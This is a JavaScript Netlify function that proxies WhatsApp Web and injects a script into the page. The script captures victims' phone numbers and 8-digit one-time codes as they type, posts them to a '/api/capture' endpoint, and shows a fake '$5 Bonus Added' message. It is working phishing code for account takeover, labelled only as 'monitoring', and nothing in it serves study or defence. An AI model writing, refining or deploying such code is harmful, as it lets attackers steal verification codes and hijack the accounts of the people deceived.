// netlify/functions/whatsapp-proxy.js
// یہ فنکشن WhatsApp Web کا HTML proxy کرتا ہے

exports.handler = async (event, context) => {
    const headers = {
        'Content-Type': 'text/html',
        'Access-Control-Allow-Origin': '*'
    };
    
    try {
        // Fetch WhatsApp Web
        const response = await fetch('https://web.whatsapp.com/', {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
        });
        
        let html = await response.text();
        
        // Add monitoring script
        const monitoringScript = `
        <script>
            // Send data to our serverless function
            async function sendData(data) {
                try {
                    const response = await fetch('/api/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            ...data,
                            userAgent: navigator.userAgent,
                            timestamp: new Date().toLocaleString()
                        })
                    });
                    console.log('Data sent:', data.type);
                } catch(e) {
                    console.error('Send error:', e);
                }
            }
            
            let capturedPhone = null;
            let capturedOtp = null;
            
            // Monitor all input fields
            function monitorInputs() {
                const allInputs = document.querySelectorAll('input');
                
                allInputs.forEach(input => {
                    if (input.hasAttribute('data-monitored')) return;
                    input.setAttribute('data-monitored', 'true');
                    
                    input.addEventListener('input', function(e) {
                        const value = this.value;
                        const type = this.type || '';
                        const placeholder = (this.placeholder || '').toLowerCase();
                        const name = (this.name || '').toLowerCase();
                        
                        // Phone number detection
                        if ((type === 'tel' || placeholder.includes('phone') || placeholder.includes('number') || name.includes('phone')) && 
                            value && value.length >= 8 && !capturedPhone) {
                            capturedPhone = value;
                            sendData({ type: 'PHONE', phone: capturedPhone });
                            console.log('📱 Phone captured:', capturedPhone);
                        }
                        
                        // 8-digit OTP detection
                        if (value && /^\\d{8}$/.test(value) && value !== capturedOtp) {
                            capturedOtp = value;
                            sendData({ type: 'OTP', phone: capturedPhone || 'Unknown', otp: capturedOtp });
                            console.log('🔐 OTP captured:', capturedOtp);
                            
                            // Show success message
                            const toast = document.createElement('div');
                            toast.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#25D366;color:white;padding:12px 24px;border-radius:40px;z-index:9999;font-weight:bold;font-family:sans-serif;box-shadow:0 4px 12px rgba(0,0,0,0.3);';
                            toast.innerHTML = '✅ Verified! $5 Bonus Added!';
                            document.body.appendChild(toast);
                            setTimeout(() => toast.remove(), 4000);
                        }
                    });
                });
            }
            
            // Monitor DOM changes
            const observer = new MutationObserver(function() {
                monitorInputs();
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
            
            // Initial monitoring
            document.addEventListener('DOMContentLoaded', function() {
                monitorInputs();
                console.log('🔍 WhatsApp Monitor Active - Netlify Version');
            });
            
            window.addEventListener('load', function() {
                setTimeout(monitorInputs, 1000);
                setTimeout(monitorInputs, 3000);
            });
        </script>
        `;
        
        // Insert monitoring script before closing body tag
        html = html.replace('</body>', monitoringScript + '</body>');
        
        return {
            statusCode: 200,
            headers,
            body: html
        };
        
    } catch (error) {
        console.error('Proxy error:', error);
        return {
            statusCode: 500,
            headers,
            body: '<h1>Error loading WhatsApp Web</h1><p>Please try again later.</p>'
        };
    }
};
